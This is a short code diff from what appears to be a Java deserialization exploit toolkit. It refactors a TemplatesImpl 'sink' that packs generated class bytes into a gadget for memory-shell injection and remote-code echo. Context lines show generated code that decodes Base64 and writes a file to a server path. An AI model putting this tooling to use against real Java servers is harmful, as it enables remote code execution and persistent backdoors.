@@ -1,7 +1,7 @@
 package com.ppp.sinks;
 
+import com.ppp.JavaClassBuilder;
 import com.ppp.JavaClassHelper;
-import com.ppp.JavaClassScheduler;
 import com.ppp.Printer;
 import com.ppp.sinks.annotation.EnchantType;
 import com.ppp.sinks.annotation.Sink;
@@ -219,7 +219,7 @@ public class TemplatesImpl {
                 "        final byte[] bytes = new sun.misc.BASE64Decoder().decodeBuffer(b);\n" +
                 "        java.io.FileOutputStream fileOutputStream = new java.io.FileOutputStream(\"%s\");\n" +
                 "        fileOutputStream.write(bytes);\n" +
-                "        fileOutputStream.close();}",b64, serverFilePath));
+                "        fileOutputStream.close();}", b64, serverFilePath));
         ctClass.addConstructor(ctConstructor);
 
 
@@ -228,17 +228,18 @@ public class TemplatesImpl {
 
 
     /**
-     * 内存马
+     * JavaClass 增强
+     * MemShell、RceEcho
      *
      * @param sinksHelper
      * @return
      * @throws Exception
      */
-    @EnchantType({EnchantType.MEMSHELL})
-    public Object memShell(SinksHelper sinksHelper) throws Exception {
+    @EnchantType({EnchantType.JavaClass})
+    public Object javaClass(SinksHelper sinksHelper) throws Exception {
         JavaClassHelper javaClassHelper = sinksHelper.getJavaClassHelper();
 
-        byte[] classBytes = JavaClassScheduler.build(javaClassHelper);
+        byte[] classBytes = JavaClassBuilder.build(javaClassHelper);
 
         return createTemplatesImpl(classBytes);
     }
